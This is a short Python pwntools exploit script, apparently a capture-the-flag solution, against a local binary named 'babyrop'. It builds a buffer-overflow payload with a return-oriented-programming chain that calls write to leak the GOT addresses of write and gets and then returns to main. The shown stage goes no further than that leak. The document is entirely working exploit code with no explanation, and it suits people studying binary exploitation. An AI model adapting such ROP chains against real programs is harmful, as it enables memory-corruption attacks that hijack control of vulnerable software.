# RazviOverflow
# Python3

from pwn import *

binary = process("./babyrop")
static_binary = ELF("./babyrop")
#binary = remote("")


write_plt_address = p64(static_binary.plt['write'])
write_got_address = p64(static_binary.got['write'])
gets_got_address = p64(static_binary.got['gets'])
main_address = p64(static_binary.symbols['main'])

mov_edx_0xbf00000e_ret = p64(0x401146) #mov edx, 0xbf00000e; add dword[rax], eax; add byte[rax], al; call 0x401030; This calls to write
pop_rsi_pop_r15_ret = p64(0x4011d1)
pop_rdi_ret = p64(0x4011d3) 
ret = p64(0x40101a)
add_eax_ret = p64(0x401117)

payload = b"A" * 0x40 + p64(0x00404038) + ret + pop_rdi_ret + p64(1) + pop_rsi_pop_r15_ret + write_got_address + p64(0) + add_eax_ret + mov_edx_0xbf00000e_ret + main_address


print(binary.recv())
binary.sendline(payload)
print(binary.recvall())
